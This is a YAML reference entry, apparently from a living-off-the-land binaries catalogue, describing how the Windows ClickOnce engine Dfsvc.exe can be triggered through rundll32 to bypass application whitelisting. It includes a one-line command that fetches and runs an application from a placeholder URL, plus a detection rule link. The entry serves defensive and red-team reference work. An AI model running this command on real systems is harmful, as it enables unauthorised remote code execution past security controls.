---
Name: Dfsvc.exe
Description: ClickOnce engine in Windows used by .NET
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo
    Description: Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)
    Usecase: Use binary to bypass Application whitelisting
    Category: AWL bypass
    Privileges: User
    MitreID: T1127
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe
  - Path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe
  - Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe
  - Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Dfsvc.exe
Code_Sample:
- Code:
Detection:
 - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_rundll32_activity.yml
Resources:
  - Link: https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
  - Link: https://stackoverflow.com/questions/13312273/clickonce-runtime-dfsvc-exe
Acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
---
